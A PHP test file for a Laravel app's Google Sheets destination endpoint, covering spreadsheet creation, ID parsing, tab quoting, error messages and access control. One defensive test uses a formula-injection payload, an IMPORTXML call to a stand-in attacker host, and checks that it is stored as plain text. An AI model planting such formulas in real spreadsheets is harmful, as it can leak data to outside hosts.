<?php

declare(strict_types=1);

use App\Enums\ConnectionStatus;
use App\Enums\PlanTier;
use App\Models\Connection;
use App\Models\Tenant;
use App\Models\User;
use App\Services\Connectors\SheetDestinationDirectory;
use App\Support\Tenancy\TenantContext;
use Database\Seeders\RolePermissionSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\Client\ConnectionException;
use Illuminate\Http\Client\Request;
use Illuminate\Support\Facades\Http;
use Spatie\Permission\PermissionRegistrar;

uses(RefreshDatabase::class);

/*
|--------------------------------------------------------------------------
| The tabular-destination sidecars (H16b) — GET/POST /integrations/connections/{connection}/sheets, backed by
| GoogleSheetsDirectory + SheetDestinationDirectory.
|
| THE POINT OF THE INCREMENT, and therefore of this file: under `drive.file` the platform can only reach files
| it created or the tenant handed it, so before this existed a destination could only be checked at DELIVERY
| time — where a wrong id surfaces as a paused rule and an emailed "your integration is broken", days later and
| nowhere near the form that caused it. Creating the spreadsheet makes the destination reachable BY
| CONSTRUCTION, and inspecting one turns the remaining failure into a sentence at setup time.
|
| The invariant throughout, inherited from ConnectionChannelsTest: this endpoint answers 200 with `error` in
| the BODY for every failure. A 4xx/5xx here would lose the half-filled rule form the tenant is standing in.
|--------------------------------------------------------------------------
*/

beforeEach(function (): void {
    TenantContext::flush();
    app(PermissionRegistrar::class)->setPermissionsTeamId(null);
    (new RolePermissionSeeder)->run();
    app(PermissionRegistrar::class)->forgetCachedPermissions();

    $this->tenant = Tenant::create(['name' => 'Acme', 'slug' => 'acme', 'default_locale' => 'en']);
    $this->tenant->domains()->create(['domain' => 'acme']);

    $this->admin = User::factory()->create();
    enterTenant($this->tenant->id, $this->admin->id);
    makeActiveMember($this->admin, 'admin');
    assignPlanTier(PlanTier::Starter);

    $this->connection = Connection::factory()->googleSheets()->create(['status' => ConnectionStatus::Active]);

    Http::preventStrayRequests();
});

afterEach(function (): void {
    app(PermissionRegistrar::class)->setPermissionsTeamId(null);
});

function sheetsUrl(Connection $connection): string
{
    return 'http://acme.meridian.test/integrations/connections/'.$connection->id.'/sheets';
}

it('creates a spreadsheet with our header row, in ONE call', function (): void {
    Http::fake([
        'sheets.googleapis.com/v4/spreadsheets' => Http::response([
            'spreadsheetId' => 'SHEET_ID_0000000000000001',
            'spreadsheetUrl' => 'https://docs.google.com/spreadsheets/d/SHEET_ID_0000000000000001/edit',
            'properties' => ['title' => 'Clinic Intake — responses'],
            'sheets' => [['properties' => ['title' => 'Responses']]],
        ], 200),
    ]);

    $response = $this->actingAs($this->admin)->postJson(sheetsUrl($this->connection), [
        'title' => 'Clinic Intake — responses',
        'headers' => ['Full name', 'Colour', 'Submission ID'],
    ]);

    $response->assertOk()
        ->assertJsonPath('error', null)
        ->assertJsonPath('destination.spreadsheet_id', 'SHEET_ID_0000000000000001')
        ->assertJsonPath('destination.sheet_name', 'Responses')
        ->assertJsonPath('destination.header_row', ['Full name', 'Colour', 'Submission ID']);

    // ONE request, not create-then-populate: a two-call create has a window where the tenant owns a
    // spreadsheet with no header row, and a failed second call leaves it there permanently.
    expect(Http::recorded()->count())->toBe(1);

    Http::assertSent(function (Request $request): bool {
        $values = $request->data()['sheets'][0]['data'][0]['rowData'][0]['values'] ?? [];

        // `stringValue` is Google's literal-text field: a header beginning `=` is stored as text and never
        // evaluated. It is the create-time equivalent of the adapter's valueInputOption=RAW, and the only
        // reason this endpoint is not a second formula-injection sink (threat model §5).
        return array_column(array_column($values, 'userEnteredValue'), 'stringValue')
            === ['Full name', 'Colour', 'Submission ID'];
    });
});

it('never lets a header be written as a formula', function (): void {
    Http::fake(['sheets.googleapis.com/v4/spreadsheets' => Http::response([
        'spreadsheetId' => 'SHEET_ID_0000000000000002',
        'sheets' => [['properties' => ['title' => 'Responses']]],
    ], 200)]);

    $this->actingAs($this->admin)->postJson(sheetsUrl($this->connection), [
        'title' => 'Intake',
        'headers' => ['=IMPORTXML("https://attacker.example","//x")'],
    ])->assertOk();

    Http::assertSent(function (Request $request): bool {
        $cell = $request->data()['sheets'][0]['data'][0]['rowData'][0]['values'][0] ?? [];

        // The whole cell is asserted, not just the presence of stringValue: a `formulaValue` sibling would
        // be evaluated by Google regardless of what else the cell carries.
        return $cell === ['userEnteredValue' => ['stringValue' => '=IMPORTXML("https://attacker.example","//x")']];
    });
});

it('inspects an existing spreadsheet from the URL a tenant actually pastes', function (): void {
    Http::fake([
        'sheets.googleapis.com/v4/spreadsheets/*/values/*' => Http::response(['values' => [['Name', '', 'Notes']]], 200),
        'sheets.googleapis.com/v4/spreadsheets/*' => Http::response([
            'spreadsheetId' => 'SHEET_ID_0000000000000003',
            'properties' => ['title' => 'Q3 Intake'],
            'sheets' => [['properties' => ['title' => 'Form Responses 1']], ['properties' => ['title' => 'Notes']]],
        ], 200),
    ]);

    $response = $this->actingAs($this->admin)->getJson(sheetsUrl($this->connection).'?'.http_build_query([
        // Nobody reads an id out of this by hand; they copy the address bar, fragment and all.
        'reference' => 'https://docs.google.com/spreadsheets/d/SHEET_ID_0000000000000003/edit#gid=0',
    ]));

    $response->assertOk()
        ->assertJsonPath('error', null)
        ->assertJsonPath('destination.spreadsheet_id', 'SHEET_ID_0000000000000003')
        ->assertJsonPath('destination.title', 'Q3 Intake')
        ->assertJsonPath('destination.tabs', ['Form Responses 1', 'Notes'])
        // The first tab, since none was named.
        ->assertJsonPath('destination.sheet_name', 'Form Responses 1')
        // ⚠️ THE INTERIOR BLANK SURVIVES. It is a real, addressable column and both consumers of the mapping
        // engine write POSITIONALLY, so dropping it would shift every column after it one place left and file
        // every answer under the wrong heading — the exact failure ocr-pipeline-design.md:84 names.
        ->assertJsonPath('destination.header_row', ['Name', '', 'Notes']);
});

it('reads the header row of the tab that was asked for, quoted for A1', function (): void {
    Http::fake([
        'sheets.googleapis.com/v4/spreadsheets/*/values/*' => Http::response(['values' => [['Reference']]], 200),
        'sheets.googleapis.com/v4/spreadsheets/*' => Http::response([
            'spreadsheetId' => 'SHEET_ID_0000000000000004',
            'sheets' => [['properties' => ['title' => 'Sheet1']], ['properties' => ['title' => "Ana's data"]]],
        ], 200),
    ]);

    $this->actingAs($this->admin)->getJson(sheetsUrl($this->connection).'?'.http_build_query([
        'reference' => 'SHEET_ID_0000000000000004',
        'sheet_name' => "Ana's data",
    ]))->assertOk()->assertJsonPath('destination.sheet_name', "Ana's data");

    Http::assertSent(function (Request $request): bool {
        if (! str_contains($request->url(), '/values/')) {
            return false;
        }

        // Unconditionally quoted with the apostrophe DOUBLED per A1's own rule — the defect H16a found by
        // re-reading its adapter, and Google's own default tab name for a form-linked sheet has spaces.
        return str_contains(urldecode($request->url()), "'Ana''s data'!1:1");
    });
});

it('refuses a tab that is no longer there rather than silently retargeting the rule', function (): void {
    Http::fake(['sheets.googleapis.com/v4/spreadsheets/*' => Http::response([
        'spreadsheetId' => 'SHEET_ID_0000000000000005',
        'sheets' => [['properties' => ['title' => 'Sheet1']]],
    ], 200)]);

    $this->actingAs($this->admin)->getJson(sheetsUrl($this->connection).'?'.http_build_query([
        'reference' => 'SHEET_ID_0000000000000005',
        'sheet_name' => 'Deleted tab',
    ]))->assertOk()->assertJsonPath('destination', null)
        ->assertJsonPath('error', 'That tab isn’t in the spreadsheet any more. Pick another one.');
});

it('explains the drive.file 404 instead of leaving it as "not found"', function (): void {
    // The single most likely failure a tenant will hit, and the one that reads as our bug: they are looking
    // at a spreadsheet they own, and we genuinely cannot see it. The copy has to say why AND offer the way out.
    Http::fake(['sheets.googleapis.com/v4/spreadsheets/*' => Http::response([
        'error' => ['code' => 404, 'status' => 'NOT_FOUND'],
    ], 404)]);

    $response = $this->actingAs($this->admin)->getJson(sheetsUrl($this->connection).'?'.http_build_query([
        'reference' => 'SHEET_ID_0000000000000006',
    ]));

    $response->assertOk()->assertJsonPath('destination', null);

    expect($response->json('error'))
        ->toContain('per-file access')
        ->toContain('create one here');
});

it('tells a rate limit apart from a permission refusal, though both arrive as 403', function (): void {
    Http::fake(['sheets.googleapis.com/v4/spreadsheets/*' => Http::response([
        'error' => ['code' => 403, 'status' => 'RESOURCE_EXHAUSTED'],
    ], 403)]);

    $response = $this->actingAs($this->admin)->getJson(sheetsUrl($this->connection).'?'.http_build_query([
        'reference' => 'SHEET_ID_0000000000000007',
    ]));

    // Telling a tenant to re-pick their spreadsheet because Google is rate-limiting us is worse than silence.
    expect($response->json('error'))->toContain('rate-limiting');
});

it('degrades a transport failure to a sentence, never a 5xx', function (): void {
    Http::fake(['sheets.googleapis.com/*' => fn () => throw new ConnectionException('timeout')]);

    $this->actingAs($this->admin)->getJson(sheetsUrl($this->connection).'?'.http_build_query([
        'reference' => 'SHEET_ID_0000000000000008',
    ]))->assertOk()->assertJsonPath('destination', null);
});

it('refuses to call Google at all for a dead grant', function (): void {
    // ⚠️ THE EXISTING GRANT IS MUTATED, NOT A SECOND ONE MINTED — and the first draft of this test did the
    // latter and hit a 23505. That is H16a's recorded narrowing enforcing itself: no identity scope means
    // `external_account_id` is the CONSTANT `google-drive`, so `connections_tenant_provider_account_unique`
    // permits a tenant exactly ONE live Google connection. Worth writing down: the constraint is the feature.
    $dead = $this->connection;
    $dead->forceFill(['status' => ConnectionStatus::RefreshFailed, 'last_error' => 'invalid_grant'])->save();

    $this->actingAs($this->admin)->getJson(sheetsUrl($dead).'?'.http_build_query([
        'reference' => 'SHEET_ID_0000000000000009',
    ]))->assertOk()->assertJsonPath('error', 'This account needs to be reconnected before we can reach your spreadsheets.');

    // Http::preventStrayRequests() would have thrown had anything been attempted; asserting nothing was sent
    // states the intent rather than relying on that side effect.
    expect(Http::recorded()->count())->toBe(0);
});

it('says so plainly when the provider has no tabular destinations at all', function (): void {
    $slack = Connection::factory()->create(['status' => ConnectionStatus::Active]);

    $this->actingAs($this->admin)->getJson(sheetsUrl($slack).'?'.http_build_query([
        'reference' => 'SHEET_ID_0000000000000010',
    ]))->assertOk()->assertJsonPath('error', 'This integration doesn’t deliver into spreadsheets.');
});

it('rejects a reference that is not a sheets link before any request is made', function (): void {
    $this->actingAs($this->admin)->getJson(sheetsUrl($this->connection).'?'.http_build_query([
        'reference' => 'my spreadsheet',
    ]))->assertOk()->assertJsonPath('destination', null);

    expect(Http::recorded()->count())->toBe(0);
});

it('parses the id out of every shape a tenant can supply, and nothing else', function (): void {
    $id = 'SHEET_ID_0000000000000011';

    expect(SheetDestinationDirectory::spreadsheetIdFrom("https://docs.google.com/spreadsheets/d/{$id}/edit#gid=0"))->toBe($id)
        ->and(SheetDestinationDirectory::spreadsheetIdFrom("https://docs.google.com/spreadsheets/d/{$id}"))->toBe($id)
        ->and(SheetDestinationDirectory::spreadsheetIdFrom("  {$id}  "))->toBe($id)
        // ⚠️ The URL arm is anchored on the `/spreadsheets/d/` path segment rather than "a long token
        // somewhere in the string". A greedy match would happily return `docs`, `google` or the gid.
        ->and(SheetDestinationDirectory::spreadsheetIdFrom('https://docs.google.com/document/d/'.$id.'/edit'))->toBeNull()
        ->and(SheetDestinationDirectory::spreadsheetIdFrom('short'))->toBeNull()
        ->and(SheetDestinationDirectory::spreadsheetIdFrom(''))->toBeNull();
});

it('lets a reader inspect but not create — the create writes into the tenant\'s Drive', function (): void {
    $viewer = User::factory()->create();
    makeActiveMember($viewer, 'viewer');

    $this->actingAs($viewer)->getJson(sheetsUrl($this->connection).'?reference=x')->assertForbidden();
    $this->actingAs($viewer)->postJson(sheetsUrl($this->connection), ['title' => 'x', 'headers' => ['a']])->assertForbidden();
});

it('is gated by the plan, like every other connector surface', function (): void {
    assignPlanTier(PlanTier::Free);

    $this->actingAs($this->admin)
        ->getJson(sheetsUrl($this->connection).'?reference=x')
        ->assertRedirect();
});
